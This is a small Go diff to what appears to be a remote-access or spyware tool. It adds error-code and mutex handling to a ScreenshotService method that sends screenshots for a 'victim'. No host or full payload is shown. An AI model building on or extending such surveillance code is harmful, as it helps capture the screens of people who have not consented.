@@ -45,7 +45,10 @@ func (s *ScreenshotService) Communicate(victim string) {
 			_, err := network.HandleImageRequest(s.image, "screenshot", victim)
 			if err != nil {
 				fmt.Println("Error sending the request")
+				s.errcode = Error
 			} else {
+				s.errcode = Pending
+				s.Mutex.Unlock()
 				break
 			}
 		}
